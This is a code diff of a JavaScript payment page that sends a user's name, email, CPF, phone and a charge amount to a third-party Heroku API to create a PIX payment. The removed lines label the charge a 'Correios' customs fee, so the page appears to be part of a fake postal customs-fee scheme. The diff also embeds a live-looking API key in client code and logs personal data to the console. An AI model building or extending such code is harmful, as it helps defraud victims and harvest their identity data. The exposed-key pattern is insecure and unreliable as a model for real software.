@@ -146,6 +146,17 @@ export default function PagamentoPage() {
       const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, '');
       const telefoneLimpo = dadosUsuario.telefone.replace(/\D/g, '');
 
+      // Dados para envio na API
+      const paymentData = {
+        name: dadosUsuario.nome,
+        email: dadosUsuario.email,
+        cpf: cpfLimpo,
+        phone: telefoneLimpo,
+        amount: valorTaxa
+      };
+
+      console.log('Enviando dados para API:', paymentData);
+
       // Gera pagamento PIX via For4Payments
       const response = await fetch('https://elite-manager-api-62571bbe8e96.herokuapp.com/api/payments/for4payments/pix/generate', {
         method: 'POST',
@@ -153,14 +164,7 @@ export default function PagamentoPage() {
           'Content-Type': 'application/json',
           'x-api-key': '3d6bd4c17dd31877b77482b341c74d32494a1d6fbdee4c239cf8432b424b1abf'
         },
-        body: JSON.stringify({
-          name: dadosUsuario.nome,
-          email: dadosUsuario.email,
-          cpf: cpfLimpo,
-          phone: telefoneLimpo,
-          amount: valorTaxa,
-          description: 'Taxa Alfandegária - Correios'
-        })
+        body: JSON.stringify(paymentData)
       });
 
       const data = await response.json();
